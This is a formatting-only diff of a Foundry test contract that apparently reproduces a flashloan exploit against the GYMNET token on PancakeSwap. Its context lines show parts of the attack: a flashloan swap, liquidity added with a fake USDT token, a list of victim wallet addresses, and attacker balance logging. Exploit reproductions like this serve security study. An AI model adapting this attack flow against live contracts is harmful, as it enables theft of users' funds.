@@ -55,7 +55,7 @@ contract GYMTest is Test {
         // );
         emit log_named_decimal_uint(
             "Attacker GYMNET balance before exploit", GYMNET.balanceOf(address(this)), GYMNET.decimals()
-            );
+        );
         console.log("1. Taking GYMNET flashloan");
         PancakePair.swap(1_010_000 * 1e18, 0, address(this), new bytes(1));
     }
@@ -79,7 +79,7 @@ contract GYMTest is Test {
 
         emit log_named_decimal_uint(
             "2a. Added attacker's liquidity", CakeLP.balanceOf(address(this)), CakeLP.decimals()
-            );
+        );
 
         address[] memory victims = new address[](18);
         victims[0] = 0x0C8bbd0629050b78C91F1AAfDCF04e90238B3568;
@@ -108,7 +108,7 @@ contract GYMTest is Test {
 
         emit log_named_decimal_uint(
             "4. Removing GYMNET-fakeUSDT liquidity", CakeLP.balanceOf(address(this)), CakeLP.decimals()
-            );
+        );
         PancakeRouter.removeLiquidity(
             address(GYMNET),
             address(fakeUSDT),
@@ -129,7 +129,7 @@ contract GYMTest is Test {
         // );
         emit log_named_decimal_uint(
             "Attacker GYMNET balance after exploit", GYMNET.balanceOf(address(this)), GYMNET.decimals()
-            );
+        );
     }
 
     function GYMNETTofakeUSDT(address victim) internal {
